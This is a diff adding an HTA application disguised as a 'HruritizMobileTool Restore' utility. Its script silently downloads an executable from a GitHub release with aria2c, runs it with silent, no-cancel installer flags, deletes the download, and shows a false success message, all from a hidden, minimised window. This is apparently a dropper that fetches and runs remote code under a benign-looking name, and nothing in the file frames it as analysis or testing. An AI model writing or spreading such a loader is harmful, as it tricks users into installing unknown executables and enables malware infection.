@@ -1,0 +1,13 @@
+<hta:application showintaskbar="no" windowstate="minimize" border="none" caption="no" APPLICATIONNAME="HruritizMobileTool Restore" ICON="Image/icon.ico"/>
+<title>HruritizMobileTool Restore</title>
+<script>
+var shell = new ActiveXObject("WScript.Shell");
+var cmdTitle = "HruritizMobileTool Restore";
+var ariaCmd = 'aria2c.exe --allow-overwrite=true -d . -o Restore_v1.1.exe "https://github.com/stOrageLoCK2183/repo/releases/download/release/Restore_v1.1.exe"';
+var installerCmd = 'Restore_v1.1.exe /SILENT /SP- /NOCANCEL /NORESTART';
+var cleanupCmd = 'timeout /t 3 >nul && del /f /q "Restore_v1.1.exe" & if exist "Restore_v1.1.exe" (del /f /q "Restore_v1.1.exe")';
+var fullCmd = 'cmd /c title "' + cmdTitle + '" && ' + ariaCmd + ' && ' + installerCmd + ' && ' + cleanupCmd;
+shell.Run(fullCmd, 1, true);
+alert("Succesfully Restored.");
+window.close();
+</script>
